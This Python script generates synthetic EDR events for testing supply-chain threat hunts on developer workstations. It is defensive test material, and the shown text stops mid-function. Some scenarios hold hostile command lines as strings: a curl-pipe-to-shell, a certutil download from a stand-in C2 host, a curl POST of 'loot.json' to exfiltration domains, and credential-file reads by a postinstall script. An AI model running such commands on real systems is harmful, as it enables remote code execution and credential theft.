#!/usr/bin/env python3
"""
Developer-workstation synthetic event generator.

Produces realistic endpoint-EDR-style events that exercise every one of the
software-supply-chain hunts H1..H18 (browser extensions, IDE extensions,
malicious npm packages) documented in the SOC playbooks.

Each event carries an optional `_hunt_id` field listing the hunts it should
match, so a downstream test harness can verify hunt coverage end-to-end.

Event shape (loosely OCSF-aligned, kept flat for easy PowerQuery parsing):

    {
      "timestamp":  "2026-05-19T12:34:56.789Z",
      "event_id":   "<uuid>",
      "event_type": "FILE_CREATE" | "FILE_READ" | "FILE_WRITE"
                  | "PROCESS_START" | "DNS_QUERY"
                  | "REGISTRY_SET",
      "severity":   "INFO" | "LOW" | "MEDIUM" | "HIGH" | "CRITICAL",
      "endpoint":   {"name": ..., "os": ...},
      "actor":      {"user": {"name": ...}},
      "process":    {"image_name": ..., "image_path": ...,
                     "command_line": ..., "pid": ...,
                     "parent": {"image_name": ..., "command_line": ..., "pid": ...}},
      "file":       {"path": ..., "action": ..., "content_sample": ...},
      "dns":        {"query": ..., "response_ip": ...},
      "registry":   {"key_path": ..., "value_name": ..., "value": ...},
      "_hunt_id":   ["H3", "H4"],          # optional
      "_scenario":  "sideload_chrome_extension"   # optional
    }

Run standalone for a JSON dump:
    python3 generate_devworkstation_events.py 500 24 > sample.ndjson
"""
from __future__ import annotations

import json
import random
import sys
import uuid
from datetime import datetime, timedelta, timezone
from typing import Any, List

# ---------------------------------------------------------------------------
# Population: ~50 dev workstations, ~25 developers, mix of OS
# ---------------------------------------------------------------------------
ENDPOINTS = [
    {"name": f"dev-{loc}-{i:02d}", "os": os_name}
    for loc, count, os_name in [
        ("ber",  18, "Windows 11"),
        ("ham",   9, "macOS 15"),
        ("mun",   8, "macOS 15"),
        ("fra",   7, "Ubuntu 24.04"),
        ("ldn",   5, "Windows 11"),
        ("nyc",   3, "macOS 15"),
    ]
    for i in range(1, count + 1)
]

DEVELOPERS = [
    "alex.bauer", "anna.weber", "ben.fischer", "claudia.koch", "daniel.weiss",
    "emma.becker", "felix.schroeder", "greta.lange", "hans.zimmer", "ina.hoffmann",
    "jonas.krueger", "katja.werner", "lukas.frank", "mia.huber", "noah.peters",
    "olivia.schulz", "paul.richter", "quentin.lehmann", "rosa.neumann", "stefan.braun",
    "tina.maier", "uwe.schwarz", "vera.kraus", "wolf.kaiser", "xenia.lang",
]

# ---------------------------------------------------------------------------
# Real Chrome / Edge / Firefox / IDE process image paths per OS
# ---------------------------------------------------------------------------
BROWSER_PROCS_WIN = {
    "chrome":  ("chrome.exe",  "C:/Program Files/Google/Chrome/Application/chrome.exe"),
    "edge":    ("msedge.exe",  "C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe"),
    "firefox": ("firefox.exe", "C:/Program Files/Mozilla Firefox/firefox.exe"),
    "brave":   ("brave.exe",   "C:/Program Files/BraveSoftware/Brave-Browser/Application/brave.exe"),
}
BROWSER_PROCS_MAC = {
    "chrome":  ("Google Chrome", "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"),
    "edge":    ("Microsoft Edge", "/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge"),
    "firefox": ("firefox",       "/Applications/Firefox.app/Contents/MacOS/firefox"),
    "brave":   ("Brave Browser", "/Applications/Brave Browser.app/Contents/MacOS/Brave Browser"),
}
IDE_PROCS_WIN = {
    "vscode":   ("Code.exe",    "C:/Users/USER/AppData/Local/Programs/Microsoft VS Code/Code.exe"),
    "cursor":   ("Cursor.exe",  "C:/Users/USER/AppData/Local/Programs/cursor/Cursor.exe"),
    "windsurf": ("Windsurf.exe","C:/Users/USER/AppData/Local/Programs/windsurf/Windsurf.exe"),
    "idea":     ("idea64.exe",  "C:/Program Files/JetBrains/IntelliJ IDEA 2025.1/bin/idea64.exe"),
    "pycharm":  ("pycharm64.exe","C:/Program Files/JetBrains/PyCharm 2025.1/bin/pycharm64.exe"),
}
IDE_PROCS_MAC = {
    "vscode":   ("code", "/Applications/Visual Studio Code.app/Contents/MacOS/Electron"),
    "cursor":   ("cursor", "/Applications/Cursor.app/Contents/MacOS/Cursor"),
    "windsurf": ("windsurf", "/Applications/Windsurf.app/Contents/MacOS/Windsurf"),
    "idea":     ("idea", "/Applications/IntelliJ IDEA.app/Contents/MacOS/idea"),
}

# ---------------------------------------------------------------------------
# Reference data: known-good and known-bad extensions / packages
# ---------------------------------------------------------------------------
LEGIT_CHROME_EXT_IDS = [
    "cjpalhdlnbpafiamejdnhcphjbkeiagm",  # uBlock Origin
    "nkbihfbeogaeaoehlefnkodbefgpgknn",  # MetaMask (treated as legit dev tool here)
    "aapbdbdomjkkjkaonfhkkikfgjllcleb",  # Google Translate
    "gighmmpiobklfepjocnamgkkbiglidom",  # AdBlock
    "fihnjjcciajhdojfnbdddfaoknhalnja",  # IE Tab
    "hdokiejnpimakedhajhdlcegeplioahd",  # LastPass
    "ddkjiahejlhfcafbddmgiahcphecmpfh",  # uBlock Origin Lite
]
MALICIOUS_CHROME_EXT_IDS = [
    "pajkjnmeojmbapicmbpliphjmcekeaac",  # Cyberhaven attack victim ID (real)
    "oaikpkmjciadfpddlpjjdapglcihgdle",  # bogus example
    "khgocmkkpikpnmmkgmdnfckapcdkgfaf",  # sideloaded
]
HIGH_RISK_PERMS_COMBO = [
    ["<all_urls>", "cookies", "webRequest", "webRequestBlocking"],
    ["<all_urls>", "scripting", "tabs", "nativeMessaging"],
    ["<all_urls>", "cookies", "tabs", "storage", "scripting"],
]
LEGIT_PERMS_COMBO = [
    ["storage", "activeTab"],
    ["storage"],
    ["activeTab", "scripting"],
    ["bookmarks", "storage"],
]

LEGIT_VSCODE_EXTS = [
    "ms-python.python-2025.18.0",
    "ms-vscode.cpptools-1.20.5",
    "esbenp.prettier-vscode-11.0.0",
    "dbaeumer.vscode-eslint-3.0.10",
    "rust-lang.rust-analyzer-0.4.2200",
    "golang.go-0.42.1",
    "redhat.vscode-yaml-1.16.0",
    "ms-azuretools.vscode-docker-1.29.3",
    "vscode-icons-team.vscode-icons-12.10.0",
]
MALICIOUS_VSCODE_EXTS = [
    "darkdiscord.material-theme-free-2.3.1",   # typosquat of Equinusocio.material-theme
    "freecoder.prettier-vscode-official-1.0.0",  # typosquat of esbenp.prettier-vscode
    "no-name.esllint-1.0.0",                   # typosquat of dbaeumer.vscode-eslint
    "shady.python-toolkit-9.9.9",
]

LEGIT_NPM_PACKAGES = [
    "react", "lodash", "express", "axios", "typescript",
    "webpack", "vite", "next", "@types/node", "chalk",
    "commander", "debug", "yargs", "moment", "uuid",
]
MALICIOUS_NPM_PACKAGES = [
    ("expres",      "express",  "typosquat"),
    ("loadash",     "lodash",   "typosquat"),
    ("colorss",     "colors",   "typosquat"),
    ("requesst",    "request",  "typosquat"),
    ("@your-org/secret-lib",       None, "dep_confusion"),
    ("@internal-corp/db-helpers",  None, "dep_confusion"),
    ("eslint-config-airbnb-pro",   None, "lookalike"),
    ("event-stream-helper",        None, "lookalike"),
    ("ua-parser-utils",            None, "shai_hulud_worm"),
]

C2_DOMAINS = [
    "exfil-relay.workers.dev",
    "drop.4f8a2c.pages.dev",
    "logs.92ab1.trycloudflare.com",
    "collect.ngrok-free.app",
    "telemetry.pipedream.net",
    "send.webhook.site",
    "data.requestbin.com",
    "h7x2.interactsh.com",
]

LEGIT_DOMAINS = [
    "registry.npmjs.org", "github.com", "api.github.com",
    "objects.githubusercontent.com", "raw.githubusercontent.com",
    "marketplace.visualstudio.com", "update.code.visualstudio.com",
    "vscode-sync.trafficmanager.net", "openvsxorg.blob.core.windows.net",
    "pypi.org", "files.pythonhosted.org",
    "yarnpkg.com", "registry.yarnpkg.com",
    "clients2.google.com", "clients4.google.com",
    "chrome.google.com", "edge.microsoft.com",
]

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def _iso(ts: datetime) -> str:
    return ts.strftime("%Y-%m-%dT%H:%M:%S.") + f"{int(ts.microsecond/1000):03d}Z"


def _ts_random(now: datetime, hours_back: int) -> datetime:
    delta = timedelta(seconds=random.randint(0, hours_back * 3600))
    return (now - delta).replace(tzinfo=None)


def _ext_dir_path(os_name: str, home_user: str, browser: str = "chrome",
                  ext_id: str = "abc", version: str = "1.0.0") -> str:
    if os_name.startswith("Windows"):
        if browser == "firefox":
            return f"C:/Users/{home_user}/AppData/Roaming/Mozilla/Firefox/Profiles/default/extensions/{ext_id}.xpi"
        base = {
            "chrome": f"C:/Users/{home_user}/AppData/Local/Google/Chrome/User Data/Default/Extensions",
            "edge":   f"C:/Users/{home_user}/AppData/Local/Microsoft/Edge/User Data/Default/Extensions",
            "brave":  f"C:/Users/{home_user}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Extensions",
        }[browser]
        return f"{base}/{ext_id}/{version}_0/manifest.json"
    if os_name.startswith("macOS"):
        base = {
            "chrome": f"/Users/{home_user}/Library/Application Support/Google/Chrome/Default/Extensions",
            "edge":   f"/Users/{home_user}/Library/Application Support/Microsoft Edge/Default/Extensions",
            "brave":  f"/Users/{home_user}/Library/Application Support/BraveSoftware/Brave-Browser/Default/Extensions",
        }[browser]
        return f"{base}/{ext_id}/{version}_0/manifest.json"
    # Linux
    base = {
        "chrome": f"/home/{home_user}/.config/google-chrome/Default/Extensions",
        "edge":   f"/home/{home_user}/.config/microsoft-edge/Default/Extensions",
        "brave":  f"/home/{home_user}/.config/BraveSoftware/Brave-Browser/Default/Extensions",
    }[browser]
    return f"{base}/{ext_id}/{version}_0/manifest.json"


def _vscode_ext_path(os_name: str, home_user: str, flavor: str, ext_dir: str) -> str:
    folder = {"vscode": ".vscode", "cursor": ".cursor", "windsurf": ".windsurf"}.get(flavor, ".vscode")
    if os_name.startswith("Windows"):
        return f"C:/Users/{home_user}/{folder}/extensions/{ext_dir}/package.json"
    if os_name.startswith("macOS"):
        return f"/Users/{home_user}/{folder}/extensions/{ext_dir}/package.json"
    return f"/home/{home_user}/{folder}/extensions/{ext_dir}/package.json"


def _jetbrains_plugin_path(os_name: str, home_user: str, product: str, plugin: str) -> str:
    if os_name.startswith("Windows"):
        return (f"C:/Users/{home_user}/AppData/Roaming/JetBrains/{product}2025.1/"
                f"plugins/{plugin}/META-INF/plugin.xml")
    if os_name.startswith("macOS"):
        return (f"/Users/{home_user}/Library/Application Support/JetBrains/{product}2025.1/"
                f"plugins/{plugin}/META-INF/plugin.xml")
    return (f"/home/{home_user}/.local/share/JetBrains/{product}2025.1/"
            f"plugins/{plugin}/META-INF/plugin.xml")


def _cred_file_path(os_name: str, home_user: str, kind: str) -> str:
    rel = {
        "ssh_key":  ".ssh/id_ed25519",
        "ssh_cfg":  ".ssh/config",
        "aws":      ".aws/credentials",
        "gcp":      ".config/gcloud/application_default_credentials.json",
        "azure":    ".azure/accessTokens.json",
        "netrc":    ".netrc",
        "npmrc":    ".npmrc",
        "docker":   ".docker/config.json",
        "kube":     ".kube/config",
        "gitconfig":".gitconfig",
        "env":      "projects/web/.env.production",
    }[kind]
    if os_name.startswith("Windows"):
        return f"C:/Users/{home_user}/{rel}"
    if os_name.startswith("macOS"):
        return f"/Users/{home_user}/{rel}"
    return f"/home/{home_user}/{rel}"


def _proc_browser(endpoint, browser):
    table = BROWSER_PROCS_WIN if endpoint["os"].startswith("Windows") else BROWSER_PROCS_MAC
    return table[browser]


def _proc_ide(endpoint, flavor):
    table = IDE_PROCS_WIN if endpoint["os"].startswith("Windows") else IDE_PROCS_MAC
    if flavor not in table:
        flavor = "vscode"
    return table[flavor]


def _new_event(ts: datetime, event_type: str, endpoint: dict, user: str,
               severity: str = "INFO", scenario: str = "",
               hunt_ids: list | None = None) -> dict:
    return {
        "timestamp": _iso(ts),
        "event_id":  str(uuid.uuid4()),
        "event_type": event_type,
        "severity":  severity,
        "endpoint":  {"name": endpoint["name"], "os": endpoint["os"]},
        "actor":     {"user": {"name": user}},
        "_scenario": scenario,
        "_hunt_id":  hunt_ids or [],
    }


# ---------------------------------------------------------------------------
# Scenario generators — each produces a CHAIN of events that, taken together,
# trip one or more hunts.
# ---------------------------------------------------------------------------
def scenario_legit_browser_extension_install(ts, endpoint, user):
    """Baseline: legitimate Chrome Web Store install."""
    ext_id  = random.choice(LEGIT_CHROME_EXT_IDS)
    browser = random.choice(["chrome", "edge"])
    proc_name, proc_path = _proc_browser(endpoint, browser)
    ver = f"{random.randint(1,12)}.{random.randint(0,30)}.{random.randint(0,999)}"
    path = _ext_dir_path(endpoint["os"], user, browser=browser, ext_id=ext_id, version=ver)
    perms = random.choice(LEGIT_PERMS_COMBO)
    manifest = json.dumps({
        "manifest_version": 3, "name": "Legit Tool", "version": ver,
        "permissions": perms, "host_permissions": []
    })
    ev = _new_event(ts, "FILE_CREATE", endpoint, user,
                    scenario="legit_browser_extension_install",
                    hunt_ids=["H1"])
    ev["process"] = {"image_name": proc_name, "image_path": proc_path,
                     "command_line": f"\"{proc_path}\"", "pid": random.randint(1000, 60000),
                     "parent": {"image_name": "explorer.exe" if endpoint["os"].startswith("Windows") else "launchd", "command_line": "", "pid": 4}}
    ev["file"] = {"path": path, "action": "create", "content_sample": manifest}
    return [ev]


def scenario_dangerous_perms_extension(ts, endpoint, user):
    """H2: extension with cookies + <all_urls> + webRequest combo."""
    ext_id  = random.choice(MALICIOUS_CHROME_EXT_IDS)
    browser = "chrome"
    proc_name, proc_path = _proc_browser(endpoint, browser)
    ver = "0.1.337"
    path = _ext_dir_path(endpoint["os"], user, browser=browser, ext_id=ext_id, version=ver)
    perms = random.choice(HIGH_RISK_PERMS_COMBO)
    manifest = json.dumps({
        "manifest_version": 3, "name": "Easy Auto Fill", "version": ver,
        "permissions": perms, "host_permissions": ["<all_urls>"]
    })
    ev = _new_event(ts, "FILE_CREATE", endpoint, user, severity="MEDIUM",
                    scenario="dangerous_perms_extension",
                    hunt_ids=["H1", "H2"])
    ev["process"] = {"image_name": proc_name, "image_path": proc_path,
                     "command_line": f"\"{proc_path}\"", "pid": random.randint(1000, 60000),
                     "parent": {"image_name": "explorer.exe", "command_line": "", "pid": 4}}
    ev["file"] = {"path": path, "action": "create", "content_sample": manifest}
    return [ev]


def scenario_sideloaded_extension(ts, endpoint, user):
    """H3: malware drops an extension folder directly — no browser parent."""
    ext_id = random.choice(MALICIOUS_CHROME_EXT_IDS)
    ver = "1.0.0"
    path = _ext_dir_path(endpoint["os"], user, browser="chrome",
                         ext_id=ext_id, version=ver)
    dropper_name, dropper_path = (
        ("svc_helper.exe", f"C:/Users/{user}/AppData/Local/Temp/svc_helper.exe")
        if endpoint["os"].startswith("Windows")
        else ("update_helper", f"/Users/{user}/Library/Caches/update_helper")
    )
    ev = _new_event(ts, "FILE_CREATE", endpoint, user, severity="HIGH",
                    scenario="sideloaded_chrome_extension",
                    hunt_ids=["H1", "H3"])
    ev["process"] = {"image_name": dropper_name, "image_path": dropper_path,
                     "command_line": f"\"{dropper_path}\" --install",
                     "pid": random.randint(1000, 60000),
                     "parent": {"image_name": "powershell.exe", "command_line": "powershell -enc <obfuscated>", "pid": 200}}
    ev["file"] = {"path": path, "action": "create",
                  "content_sample": '{"manifest_version":3,"name":"Helper","version":"1.0.0","permissions":["<all_urls>","cookies","webRequest","webRequestBlocking"],"host_permissions":["<all_urls>"]}'}
    return [ev]


def scenario_native_messaging_host(ts, endpoint, user):
    """H4: extension registers a native messaging host pointing at a binary."""
    if not endpoint["os"].startswith("Windows"):
        return []
    nm_name = random.choice(["com.devhelper.bridge", "com.acme.connector", "com.update_svc.host"])
    ev = _new_event(ts, "REGISTRY_SET", endpoint, user, severity="MEDIUM",
                    scenario="native_messaging_host_registered",
                    hunt_ids=["H4"])
    ev["process"] = {"image_name": "chrome.exe",
                     "image_path": "C:/Program Files/Google/Chrome/Application/chrome.exe",
                     "command_line": "\"chrome.exe\"",
                     "pid": random.randint(1000, 60000),
                     "parent": {"image_name": "explorer.exe", "command_line": "", "pid": 4}}
    ev["registry"] = {
        "key_path": f"HKCU\\Software\\Google\\Chrome\\NativeMessagingHosts\\{nm_name}",
        "value_name": "(Default)",
        "value":     f"C:/Users/{user}/AppData/Roaming/{nm_name}.json"
    }
    # plus the child native host launch a few seconds later
    ev2 = _new_event(ts + timedelta(seconds=5), "PROCESS_START", endpoint, user,
                     severity="MEDIUM", scenario="native_messaging_host_launch",
                     hunt_ids=["H4"])
    ev2["process"] = {"image_name": f"{nm_name.split('.')[-1]}.exe",
                      "image_path": f"C:/Users/{user}/AppData/Local/{nm_name}/host.exe",
                      "command_line": f"\"C:/Users/{user}/AppData/Local/{nm_name}/host.exe\"",
                      "pid": random.randint(1000, 60000),
                      "parent": {"image_name": "chrome.exe",
                                 "command_line": "\"chrome.exe\"",
                                 "pid": ev["process"]["pid"]}}
    return [ev, ev2]


def scenario_browser_beacon(ts, endpoint, user):
    """H5: chrome resolves a C2-looking domain (extension exfil)."""
    proc_name, proc_path = _proc_browser(endpoint, "chrome")
    domain = random.choice(C2_DOMAINS)
    events = []
    # 6-8 beacons over 20 minutes -> low blast radius, persistent
    base = ts
    for i in range(random.randint(6, 8)):
        ev = _new_event(base + timedelta(minutes=3 * i), "DNS_QUERY", endpoint, user,
                        scenario="browser_extension_beacon", hunt_ids=["H5"])
        ev["process"] = {"image_name": proc_name, "image_path": proc_path,
                         "command_line": f"\"{proc_path}\" --type=renderer",
                         "pid": random.randint(1000, 60000),
                         "parent": {"image_name": proc_name,
                                    "command_line": f"\"{proc_path}\"", "pid": 1234}}
        ev["dns"] = {"query": domain,
                     "response_ip": f"104.21.{random.randint(0,255)}.{random.randint(0,255)}"}
        events.append(ev)
    return events


def scenario_legit_ide_extension(ts, endpoint, user):
    """Baseline: legitimate VS Code / Cursor extension install."""
    flavor = random.choice(["vscode", "cursor", "windsurf"])
    proc_name, proc_path = _proc_ide(endpoint, flavor)
    ext_dir = random.choice(LEGIT_VSCODE_EXTS)
    path = _vscode_ext_path(endpoint["os"], user, flavor, ext_dir)
    ev = _new_event(ts, "FILE_CREATE", endpoint, user,
                    scenario="legit_ide_extension_install", hunt_ids=["H6"])
    ev["process"] = {"image_name": proc_name, "image_path": proc_path,
                     "command_line": f"\"{proc_path}\" --install-extension {ext_dir.rsplit('-',1)[0]}",
                     "pid": random.randint(1000, 60000),
                     "parent": {"image_name": "explorer.exe" if endpoint["os"].startswith("Windows") else "launchd",
                                "command_line": "", "pid": 4}}
    ev["file"] = {"path": path, "action": "create",
                  "content_sample": json.dumps({"name": ext_dir, "engines": {"vscode": "^1.90.0"}})}
    return [ev]


def scenario_malicious_ide_extension(ts, endpoint, user):
    """H6: typosquatted IDE extension installed."""
    flavor = random.choice(["vscode", "cursor"])
    proc_name, proc_path = _proc_ide(endpoint, flavor)
    ext_dir = random.choice(MALICIOUS_VSCODE_EXTS)
    path = _vscode_ext_path(endpoint["os"], user, flavor, ext_dir)
    ev = _new_event(ts, "FILE_CREATE", endpoint, user, severity="HIGH",
                    scenario="malicious_ide_extension_install", hunt_ids=["H6"])
    ev["process"] = {"image_name": proc_name, "image_path": proc_path,
                     "command_line": f"\"{proc_path}\" --install-extension {ext_dir}",
                     "pid": random.randint(1000, 60000),
                     "parent": {"image_name": "explorer.exe", "command_line": "", "pid": 4}}
    ev["file"] = {"path": path, "action": "create",
                  "content_sample": json.dumps({"name": ext_dir, "main": "./extension.js",
                                                "activationEvents": ["*"],
                                                "scripts": {"postinstall": "node setup.js"}})}
    return [ev]


def scenario_ide_spawns_shell(ts, endpoint, user):
    """H7: IDE spawns powershell/cmd/bash with suspicious flags."""
    flavor = random.choice(["vscode", "cursor", "windsurf"])
    ide_name, ide_path = _proc_ide(endpoint, flavor)
    if endpoint["os"].startswith("Windows"):
        child_name = random.choice(["powershell.exe", "cmd.exe", "certutil.exe"])
        cmd = ("powershell.exe -nop -w hidden -enc " +
               "JABwAD0AJwBoAHQAdABwAHMAOgAvAC8AZQB4AGYAaQBsAC4Ad29yAGsAZQByAHMALgBkAGUAdgAvAGEAYgBjAGQAJwA="
               if child_name == "powershell.exe" else "certutil.exe -urlcache -split -f https://drop.4f8a2c.pages.dev/x.bin x.bin")
    else:
        child_name = random.choice(["bash", "sh", "curl"])
        cmd = "/bin/bash -c 'curl -s https://exfil-relay.workers.dev/x | sh'"
    ev = _new_event(ts, "PROCESS_START", endpoint, user, severity="HIGH",
                    scenario="ide_spawns_suspicious_shell", hunt_ids=["H7", "H8"])
    ev["process"] = {"image_name": child_name, "image_path": child_name,
                     "command_line": cmd, "pid": random.randint(1000, 60000),
                     "parent": {"image_name": ide_name,
                                "command_line": f"\"{ide_path}\" --folder-uri file:///tmp/cloned-repo",
                                "pid": random.randint(1000, 60000)}}
    return [ev]


def scenario_ide_reads_creds(ts, endpoint, user):
    """H9: IDE (or node child) reads SSH key / AWS creds / .env."""
    flavor = random.choice(["vscode", "cursor"])
    ide_name, ide_path = _proc_ide(endpoint, flavor)
    # node child of the IDE doing the read = malicious extension exfil
    kinds = random.sample(["ssh_key", "aws", "env", "kube", "gitconfig"], k=3)
    events = []
    pid_node = random.randint(1000, 60000)
    for kind in kinds:
        ev = _new_event(ts + timedelta(seconds=random.randint(1, 60)),
                        "FILE_READ", endpoint, user, severity="HIGH",
                        scenario="ide_extension_reads_creds", hunt_ids=["H9"])
        ev["process"] = {"image_name": "node" if not endpoint["os"].startswith("Windows") else "node.exe",
                         "image_path": "/usr/local/bin/node" if not endpoint["os"].startswith("Windows") else "C:/Program Files/nodejs/node.exe",
                         "command_line": "node /Users/USER/.cursor/extensions/shady.python-toolkit-9.9.9/extension.js",
                         "pid": pid_node,
                         "parent": {"image_name": ide_name,
                                    "command_line": f"\"{ide_path}\"",
                                    "pid": random.randint(1000, 60000)}}
        ev["file"] = {"path": _cred_file_path(endpoint["os"], user, kind),
                      "action": "read", "content_sample": ""}
        events.append(ev)
    return events


def scenario_ide_beacon(ts, endpoint, user):
    """H10: IDE / node child beaconing to non-IDE infrastructure."""
    flavor = random.choice(["vscode", "cursor", "windsurf"])
    ide_name, ide_path = _proc_ide(endpoint, flavor)
    domain = random.choice(C2_DOMAINS)
    events = []
    for i in range(random.randint(4, 8)):
        ev = _new_event(ts + timedelta(seconds=30 * i),
                        "DNS_QUERY", endpoint, user, severity="MEDIUM",
                        scenario="ide_beacon", hunt_ids=["H10"])
        ev["process"] = {"image_name": "node" if not endpoint["os"].startswith("Windows") else "node.exe",
                         "image_path": "/usr/local/bin/node",
                         "command_line": "node",
                         "pid": random.randint(1000, 60000),
                         "parent": {"image_name": ide_name,
                                    "command_line": f"\"{ide_path}\"",
                                    "pid": random.randint(1000, 60000)}}
        ev["dns"] = {"query": domain,
                     "response_ip": f"172.66.{random.randint(0,255)}.{random.randint(0,255)}"}
        events.append(ev)
    return events


def scenario_legit_npm_install(ts, endpoint, user):
    """Baseline: developer runs npm install <legit package>."""
    pkg = random.choice(LEGIT_NPM_PACKAGES)
    cmd = f"npm install {pkg}"
    if endpoint["os"].startswith("Windows"):
        npm_proc, npm_path = "npm.cmd", "C:/Program Files/nodejs/npm.cmd"
    else:
        npm_proc, npm_path = "npm", "/usr/local/bin/npm"
    ev = _new_event(ts, "PROCESS_START", endpoint, user,
                    scenario="legit_npm_install", hunt_ids=["H11"])
    ev["process"] = {"image_name": npm_proc, "image_path": npm_path,
                     "command_line": cmd, "pid": random.randint(1000, 60000),
                     "parent": {"image_name": "zsh" if not endpoint["os"].startswith("Windows") else "Code.exe",
                                "command_line": "", "pid": 100}}
    # also a benign DNS to npm registry
    ev_dns = _new_event(ts + timedelta(seconds=1), "DNS_QUERY", endpoint, user,
                        scenario="legit_npm_install_dns", hunt_ids=[])
    ev_dns["process"] = ev["process"]
    ev_dns["dns"] = {"query": "registry.npmjs.org", "response_ip": "104.16.30.34"}
    return [ev, ev_dns]


def scenario_postinstall_malware(ts, endpoint, user):
    """H12, H13, H14: malicious package install -> postinstall script
    reads creds, then spawns curl to C2 domain."""
    pkg, target, kind = random.choice(MALICIOUS_NPM_PACKAGES)
    cmd = f"npm install {pkg}"
    if endpoint["os"].startswith("Windows"):
        npm_proc, npm_path = "npm.cmd", "C:/Program Files/nodejs/npm.cmd"
        node_proc, node_path = "node.exe", "C:/Program Files/nodejs/node.exe"
        net_proc, net_cmd = "powershell.exe", "powershell -nop -c \"Invoke-RestMethod -Uri https://" + random.choice(C2_DOMAINS) + "/c\""
    else:
        npm_proc, npm_path = "npm", "/usr/local/bin/npm"
        node_proc, node_path = "node", "/usr/local/bin/node"
        net_proc, net_cmd = "curl", "curl -s -X POST https://" + random.choice(C2_DOMAINS) + "/c -d @/tmp/loot.json"

    pid_npm = random.randint(1000, 60000)
    pid_node = random.randint(1000, 60000)
    events = []

    # 1) npm install ...
    ev = _new_event(ts, "PROCESS_START", endpoint, user, severity="HIGH",
                    scenario=f"malicious_npm_install_{kind}",
                    hunt_ids=["H11", "H15" if kind == "typosquat" else "H16" if kind == "dep_confusion" else "H11"])
    ev["process"] = {"image_name": npm_proc, "image_path": npm_path,
                     "command_line": cmd, "pid": pid_npm,
                     "parent": {"image_name": "zsh", "command_line": "", "pid": 100}}
    events.append(ev)

    # 2) node child of npm (postinstall)
    ev2 = _new_event(ts + timedelta(seconds=3), "PROCESS_START", endpoint, user,
                     severity="HIGH", scenario="postinstall_script_node",
                     hunt_ids=["H12"])
    ev2["process"] = {"image_name": node_proc, "image_path": node_path,
                      "command_line": "node ./scripts/postinstall.js",
                      "pid": pid_node,
                      "parent": {"image_name": npm_proc, "command_line": cmd, "pid": pid_npm}}
    events.append(ev2)

    # 3) node reading creds
    for kind_file in random.sample(["ssh_key", "aws", "npmrc", "env"], k=2):
        ev3 = _new_event(ts + timedelta(seconds=random.randint(4, 10)),
                         "FILE_READ", endpoint, user, severity="HIGH",
                         scenario="postinstall_reads_creds", hunt_ids=["H13"])
        ev3["process"] = ev2["process"]
        ev3["file"] = {"path": _cred_file_path(endpoint["os"], user, kind_file),
                       "action": "read"}
        events.append(ev3)

    # 4) node child shell beaconing
    ev4 = _new_event(ts + timedelta(seconds=12), "PROCESS_START", endpoint, user,
                     severity="HIGH", scenario="postinstall_curl",
                     hunt_ids=["H12", "H14"])
    ev4["process"] = {"image_name": net_proc, "image_path": net_proc,
                      "command_line": net_cmd, "pid": random.randint(1000, 60000),
                      "parent": {"image_name": node_proc,
                                 "command_line": "node ./scripts/postinstall.js",
                                 "pid": pid_node}}
    events.append(ev4)

    # 5) DNS resolution to C2
    ev5 = _new_event(ts + timedelta(seconds=12), "DNS_QUERY", endpoint, user,
                     severity="HIGH", scenario="postinstall_c2_dns",
                     hunt_ids=["H14"])
    ev5["process"] = ev4["process"]
    domain_from_cmd = net_cmd.split("https://", 1)[1].split("/", 1)[0]
    ev5["dns"] = {"query": domain_from_cmd,
                  "response_ip": f"104.21.{random.randint(0,255)}.{random.randint(0,255)}"}
    events.append(ev5)

    # 6) for dep_confusion: include a DNS to registry.npmjs.org *with* @your-org scope
    if kind == "dep_confusion":
        ev6 = _new_event(ts + timedelta(seconds=1), "DNS_QUERY", endpoint, user,
                         severity="HIGH", scenario="dep_confusion_registry",
                         hunt_ids=["H16"])
        ev6["process"] = ev["process"]
        ev6["dns"] = {"query": "registry.npmjs.org", "response_ip": "104.16.30.34"}
        events.append(ev6)
    return events


def scenario_lockfile_mutation_no_install(ts, endpoint, user):
    """H17: package-lock.json mutated with no preceding npm install."""
    if endpoint["os"].startswith("Windows"):
        path = f"C:/Users/{user}/projects/webapp/package-lock.json"
    else:
        path = f"/Users/{user}/projects/webapp/package-lock.json"
    weird_proc = "wscript.exe" if endpoint["os"].startswith("Windows") else "osascript"
    ev = _new_event(ts, "FILE_WRITE", endpoint, user, severity="HIGH",
                    scenario="lockfile_mutation_no_install", hunt_ids=["H17"])
    ev["process"] = {"image_name": weird_proc, "image_path": weird_proc,
                     "command_line": f"{weird_proc} //e:vbs C:/Users/{user}/AppData/Local/Temp/x.vbs",
                     "pid": random.randint(1000, 60000),
                     "parent": {"image_name": "explorer.exe", "command_line": "", "pid": 4}}
    ev["file"] = {"path": path, "action": "write"}
    return [ev]


def scenario_worm_burst(ts, endpoints, users):
    """H18: shai-hulud-style cross-machine burst of the same package.
    Generates installs on N machines within a 10-minute window."""
    pkg = "ua-parser-utils"
    machines = random.sample(endpoints, k=min(8, len(endpoints)))
    events = []
    base = ts
    for i, ep in enumerate(machines):
        u = random.choice(users)
        cmd = f"npm install {pkg}"
        if ep["os"].startswith("Windows"):
            npm_proc, npm_path = "npm.cmd", "C:/Program Files/nodejs/npm.cmd"
        else:
            npm_proc, npm_path = "npm", "/usr/local/bin/npm"
        ev = _new_event(base + timedelta(seconds=random.randint(0, 600)),
                        "PROCESS_START", ep, u, severity="CRITICAL",
                        scenario="shai_hulud_worm_burst", hunt_ids=["H11", "H18"])
        ev["process"] = {"image_name": npm_proc, "image_path": npm_path,
                         "command_line": cmd, "pid": random.randint(1000, 60000),
                         "parent": {"image_name": "node", "command_line": "node /tmp/worm.js", "pid": 999}}
        events.append(ev)
    return events


# ---------------------------------------------------------------------------
# Background noise: routine dev activity (process noise so hunts don't trip
# on every event).  We don't tag these with hunt IDs.
# ---------------------------------------------------------------------------
def scenario_noise(ts, endpoint, user):
    """Random benign activity: git operations, node REPL, IDE updates, browser open."""
    pick = random.choice(["git_pull", "node_run", "browser_open", "ide_open", "yarn_install"])
    if pick == "git_pull":
        ev = _new_event(ts, "PROCESS_START", endpoint, user, scenario="noise_git", hunt_ids=[])
        ev["process"] = {"image_name": "git", "image_path": "/usr/bin/git",
                         "command_line": "git pull --rebase",
                         "pid": random.randint(1000, 60000),
                         "parent": {"image_name": "zsh", "command_line": "", "pid": 100}}
        return [ev]
    if pick == "node_run":
